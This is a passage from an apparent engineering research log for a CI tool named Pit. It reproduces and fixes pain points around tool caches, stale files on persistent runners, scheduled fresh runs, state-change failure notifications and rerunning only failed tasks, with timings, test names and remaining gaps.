run 1  src/a.txt 1792100094   src/b.txt 1792100094
run 2  src/a.txt 1792100094   src/b.txt 1792100097   .toolcache/stamp still there
```

Unchanged files keep their modification time and ignored directories survive. So
metadata-based tool caches work in Pit as they do on a laptop, with no `actions/cache`.

**Reproduction 2, a real tool:** T3 Code's `knip:check` (knip 6.34.0) in Pit's warm T3 Code
workspace, on the idle box:

| Run | Time | Result |
| --- | --- | --- |
| Without `--cache` | 213.8s | clean (exit 0) |
| `--cache`, empty cache | 36.1s | clean (exit 0) |
| `--cache`, warm | 7.7s | **2 false positives** (exit 1) |
| `--cache`, warm, after a one-file edit | 6.5s | **same 2 false positives** |
| Without `--cache`, after the edit | 202.4s | clean (exit 0) |

The false positives are `apps/server/src/testUtils/gitConfig.setup.ts` reported as an unused
file and `@shadcn/lint` as an unused devDependency. They repeat on every warm-cache run. I found
no knip issue about it. Reporting it upstream is left to the user, since it means posting
publicly.

**Verdict: SOLVED** on Pit's side: tool caches persist with correct modification times and no
configuration. The README now says so, and warns to check a tool's cache against a clean run
before gating on it. Not solved, because it is not Pit's to solve:
- **knip's cache.** Here it was 28× faster but wrong, so the T3 Code bench config still runs
  knip without it, and knip stays its slowest task (P21). Pit's own task cache keys on file
  contents and is not affected.
- **No `pit verify --fresh`.** `pit verify` skips Pit's cache, but it reuses the warm workspace
  and with it the tools' own caches. There is no command yet to run in a fresh workspace.

## P25. Leftover files on a persistent runner make broken builds pass

**Pain.** A reused runner keeps what earlier jobs left: generated code, build output, ignored
directories. A build can then pass on the runner and fail from a clean checkout. cmux found
"reload builds on reused self-hosted runners can compile source files removed from the requested
ref" and added `git clean -ffdx`
([manaflow-ai/cmux#12608](https://github.com/manaflow-ai/cmux/pull/12608)). Teams add cleanup
steps or actions for this
([community#51329](https://github.com/orgs/community/discussions/51329),
[Vendic cleaner](https://github.com/Vendic/github-self-hosted-runner-workspace-cleaner),
[rtCamp/action-cleanup](https://github.com/rtCamp/action-cleanup),
[Rob Bos](https://dev.to/rob_bos/cleaning-up-files-changed-by-a-github-action-that-runs-in-a-container-57bc)),
or delete their defensive cleanup code once they move to throwaway VMs
([vouchington#554](https://github.com/vouchington/vouchington/issues/554)). Pit keeps ignored
files on purpose (P8, P24), so it has this failure mode by design.

**Reproduction** (`/tmp/painhunt/p25`): a workspace-cached `setup` runs `gen.sh`, which writes
`gen/current.js` and `gen/legacy.js` (`gen/` is ignored), and `test` requires both. Commit 2
stops generating `legacy.js` but the test still requires it: a real bug.

**Before** (research/pain-hunt at P24):

```
commit 2, pit run      ✓ setup  ✓ test   passed       (stale gen/legacy.js from commit 1)
commit 2, pit verify   ✓ setup  ✓ test   passed       (verify only skipped the cache)
commit 2, clean clone  Error: Cannot find module './gen/legacy.js'
```

**Fix** (research/pain-hunt): `pit run --fresh` runs each group in a new, empty workspace. The
workspace is registered as busy so workspace cleanup (P19) leaves it alone, then deleted when
the group ends. The git mirror is still shared, so only the checkout is cold. `pit verify` is
now `--no-cache --fresh`, the run a brand-new runner would do.

```
commit 2, pit run      ✓ setup  ✓ test             passed in 305ms
commit 2, pit verify   ✓ setup  ✗ test exit 1      Error: Cannot find module './gen/legacy.js'
```

No `~fresh` workspace was left afterwards. Covered by the e2e test
`fresh_runs_do_not_see_files_earlier_runs_left_behind`.

**Verdict: PARTIAL.** Pit can now prove that a result does not depend on warm state, but only
when someone runs `pit verify`.
- **Not automatic.** Normal and post-merge runs stay warm because that is the speed (P8, P21),
  so a bug hidden by warm state passes them.
- **No scheduled fresh run.** The fix is a periodic `pit verify` (nightly cron, or before
  releases), and Pit has no built-in schedule for it yet.
- **It is slow.** A fresh run is cold. On T3 Code that means the 162s install, at least.

## P26. Scheduled CI runs late, gets dropped, or is silently disabled

**Pain.** Nightly and periodic jobs are where slow, cold, or fresh-environment checks go (P25's
`pit verify`, dependency audits, full test runs). GitHub says scheduled workflows "can be delayed
during periods of high loads… If the load is sufficiently high enough, some queued jobs may be
dropped", and that in public repos they are "automatically disabled when no repository activity
has occurred in 60 days". One measurement of four public workflows scheduled every 15 minutes
found only 64% of slots got a run, with a median delay of 7.4 minutes. Keepalive actions commit
to the repo just to stop schedules being disabled
([runhooks](https://runhooks.app/blog/github-actions-scheduled-workflows-unreliable/),
[lastping](https://lastping.dev/monitor/github-actions-scheduled-disabled/),
[hyperping](https://hyperping.com/blog/how-to-monitor-github-actions-scheduled-workflows),
[steadycron](https://steadycron.com/guides/github-actions-schedule-not-running/),
[cronuru](https://cronuru.com/guides/github-actions-scheduled-workflows),
[dev.to](https://dev.to/amareswer/github-actions-workflow-not-triggering-every-cause-and-fix-5070),
[efrecon/gh-action-keepalive](https://github.com/efrecon/gh-action-keepalive)).

**Before** (research/pain-hunt at P25): Pit had no schedules at all. P25's fix, a fresh
`pit verify`, only helps if someone remembers to run it. **NOT SOLVED.**

**Fix** (research/pain-hunt): `schedules` in the config, each with a five-field UTC `cron` and
optional `tasks`, `fresh` and `noCache`. The cron parser is built in, with no new dependency.
The server reads schedules from the config on each repo's default branch, memoized per tip, and
checks twice a minute. A `schedules` table records each fired slot, so a slot fires exactly once,
even across two ticks in the same minute. When a slot is due, the server fetches, then starts a
trusted run of the branch tip as `schedule:<name>`. A bad cron is a config error, like other
typos (P6).

**Live check** (`/tmp/painhunt/p25`, the repo whose stale generated file hides a bug): I added
`verify: { cron: "* * * * *", fresh: true, noCache: true }` and committed it at 21:59:12.

```
pit run (warm)            passed in 388ms
21:59:40 schedule verify on app-676dfe: started run_6aae646be56b
run_6aae646be56b  failed  schedule:verify main   Error: Cannot find module './gen/legacy.js'
```

The scheduled fresh run caught the bug the warm run passes, 28s after the commit, with no one
running anything. After the schedule was removed, no further scheduled runs appeared over the
next 75s. Covered by the unit tests `matches_like_cron`, `rejects_bad_expressions`,
`calendar_is_right` and `a_schedule_slot_fires_once`, and the e2e test
`schedules_start_one_run_per_slot`.

**Verdict: SOLVED** for scheduling on a server you run: no load-based delay beyond the 30s tick,
no dropped slots while the server is up, and no inactivity shutoff. Not done:
- **Missed slots are not replayed.** A slot that falls while the server is down is skipped.
- **UTC only.** There are no time zones.
- **Default branch only.** Only the default branch's config is read, and that branch is guessed
  for non-GitHub repos (`main`, then `master`, then `trunk`).
- **No failure notification.** A failed scheduled run notifies no one beyond the dashboard and
  GitHub statuses.

## P27. Nobody hears that main is broken

**Pain.** GitHub sends failure notifications to the person who triggered a run, and for
scheduled workflows to whoever last edited the cron line, not to the team. So every team adds a
Slack step with `if: failure()` to each workflow, often restricted to `main` and with mention
groups, or a separate `workflow_run` workflow just to send alerts
([slack-github-action guide](https://pullnotifier.com/tools/slack-github-actions),
[ravsam](https://www.ravsam.in/blog/send-slack-notification-when-github-actions-fails/),
[dev.to](https://dev.to/ravgeetdhillon/send-slack-notification-when-github-actions-fails-1ba6),
[Gitera](https://gitera.io/blog/github-actions-email-notifications),
[GitNotifier](https://www.gitnotifier.com/blog/send-slack-notifications-github-actions),
[OneUptime](https://oneuptime.com/blog/post/2025-12-20-github-actions-notifications/view)).
Alerting on every failure is noisy, so people tune it by hand.

**Before** (research/pain-hunt at P26): Pit had no notifications. P26's scheduled `pit verify`
caught P25's bug, but only the dashboard showed it. **NOT SOLVED.**

**Fix** (research/pain-hunt): `--notify-url` / `PIT_NOTIFY_URL` on `pit server` and `pit up`.
- **Which runs:** only trusted runs (P20) notify. Each line is tracked separately: the branch
  (pushes and post-merge runs) and each schedule. PR, local and merge queue runs never notify,
  and cancelled or superseded runs are ignored.
- **When:** only on a change of state, recorded in a `notify_state` table. That is one message
  when a line breaks and one when it is fixed.
- **Payload:** Slack-compatible JSON (`text`) plus structured fields (`event`, `repo`, `ref`,
  `trigger`, `run`, `url`, `failed`).

**Live check** (`/tmp/painhunt/p27`, a schedule every minute driving trusted runs; a Python
receiver logging what it gets):

```
00:13:21 Pit: app-2fdd9f main (schedule:watch) is broken: default.check failed. http://127.0.0.1:7070/runs/run_23340940390d
         (next scheduled run, still failing: no message)
00:15:23 Pit: app-2fdd9f main (schedule:watch) is fixed. http://127.0.0.1:7070/runs/run_d1e640ac7ff9
```

Covered by the unit test `only_state_changes_notify` and the e2e test
`notifies_when_a_trusted_line_breaks_and_is_fixed`, which uses an in-process webhook receiver
and expects exactly `["broken", "fixed"]` over break, still broken, fixed.

**Verdict: SOLVED** for team alerts on main and schedules, with no per-workflow wiring. Not done:
- **No retry.** Delivery is one attempt with a 10s timeout; a failure is logged.
- **No mentions.** The message does not mention the people who caused the break.
- **One URL.** There is one notify URL per server, not per repo.

## P28. Re-running a failure repeats the whole job

**Pain.** When one step fails for a reason outside the code (a service down, a network blip),
GitHub can re-run failed jobs, and since 2022 individual jobs, but not a step. A re-run gets a
fresh runner and repeats checkout, setup, install and build before it reaches the step that
failed. People ask for step-level re-runs and resume-from-failure, and work around it with retry
loops, retry actions, or `actions/cache` marker files that skip work that already passed
([community#27121](https://github.com/orgs/community/discussions/27121),
[#4278](https://github.com/orgs/community/discussions/4278),
[GitHub changelog](https://github.blog/changelog/2022-03-17-github-actions-re-run-only-failed-or-individual-jobs/),
[GitHub blog](https://github.blog/news-insights/product-news/save-time-partial-re-runs-github-actions/),
[This Dot](https://www.thisdot.co/blog/how-to-retry-failed-steps-in-github-action-workflows),
[Medium](https://medium.com/@tcorbisier/github-actions-re-run-a-single-5e9f1744c788)).

**Reproduction** (`/tmp/painhunt/p28`): `install` (3s, workspace cache), `build` (3s, outputs)
and `lint` (2s) feed `test`. `test` fails while a marker file says the database is down. One run
with the database down, then a rerun after it is back.

```
first run   ✓ install 3.1s  ✓ lint 2.0s  ✓ build 3.0s  ✗ test (ECONNREFUSED)   failed in 7.6s
rerun       ◆ install  ◆ lint  ◆ build  ✓ test 1.0s                          passed in 1.5s · 1 ran, 3 cached
```

That needed no configuration. Every task is its own cached step, and failures are not cached,
so a rerun repeats exactly the failed task and anything downstream of it. The same holds for
GitHub's "Re-run" button: Pit plans a new run, and everything that passed is a cache hit.

**Gap found:** the rerun said "ran because nothing was cached for it yet", or compared against an
older success ("package.json changed; build changed"). Both are true and neither is the reason.

**Fix** (research/pain-hunt): before explaining a miss, the worker asks
`/api/cache/failed/{key}` whether a task with these exact inputs failed before. The lookup
uses a new `tasks(action_key)` index.

```
rerun   ✓ test 1.1s  ran because it failed with these same inputs in run_5e109e42daad (failures are not cached)
        passed in 1.3s · 1 ran, 3 cached
```

Covered by the e2e test `a_rerun_reruns_only_what_failed_and_says_why`.

**Verdict: SOLVED.** A rerun costs only the failed task, and says why it ran. Not done: a task
that is itself long (a 10-minute test suite) still reruns in full, since Pit's unit of work is the
task. Splitting it (`shards`, P14) is the answer there.
